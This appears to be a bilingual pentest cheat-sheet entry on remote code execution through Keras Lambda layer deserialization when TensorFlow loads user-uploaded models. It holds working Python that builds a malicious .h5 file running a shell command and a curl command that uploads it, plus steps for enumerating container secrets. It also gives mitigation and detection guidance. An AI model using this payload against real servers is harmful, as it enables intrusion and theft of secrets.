---
topic: TensorFlow — Lambda layer deserialization
tags: [linux, tensorflow, keras, deserialization, rce]
---

# TensorFlow — Lambda layer deserialization

**English** | [🌐 Español](tensorflow-lambda-deserialization.md)

## Concept

Keras serializes a `Lambda` layer together with the Python function it contains. Loading the model with `tf.keras.models.load_model` rebuilds and executes that function. A `.h5` or `.keras` file from an untrusted user is therefore executable code on the server.

## When it applies

- The application accepts `.h5`, `.keras` or SavedModel files from users.
- The model is loaded with `load_model` without `safe_mode` or isolation.
- The process can reach secrets, the internal network or a service account.

## Procedure

1. Confirm that uploads are processed with TensorFlow/Keras.
2. Create a model with a `Lambda` layer that runs a command.
3. Upload it and watch for the callback or error response.
4. Use execution to enumerate the container and its secrets.

## Commands

```bash
# Model with a malicious Lambda layer
python3 - <<'PY'
import tensorflow as tf
layer = tf.keras.layers.Lambda(lambda x: __import__("os").system("id"))
model = tf.keras.Sequential([tf.keras.layers.Input((1,)), layer])
model.save("malicious.h5")
PY
curl -F "model=@malicious.h5" http://<HOST>/upload
# Safe loading
python3 -c "import tensorflow as tf; tf.keras.models.load_model('model.h5', safe_mode=True)"
```

## Variants

- Use a custom layer with `__reduce__` or `__setstate__`.
- Abuse `Lambda` in a Hugging Face model or pipeline.
- Combine it with a pickle artifact inside a `.keras` file.

## Limitations

- `safe_mode=True` blocks Lambdas and arbitrary functions.
- The container may lack tools for a reverse shell.
- The Keras version changes the format and checks.

## Mitigation

- Load models with `safe_mode=True` and code-free formats.
- Run inference in a container without secrets or internal network access.
- Sign and validate artifacts before loading them.

## Detection

- Models with `Lambda` layers in production.
- TensorFlow processes spawning shells or outbound connections.
- Deserialization errors followed by network activity.

## References

- [0xdf — Artificial](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [TensorFlow — Security](https://www.tensorflow.org/responsible_ai)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
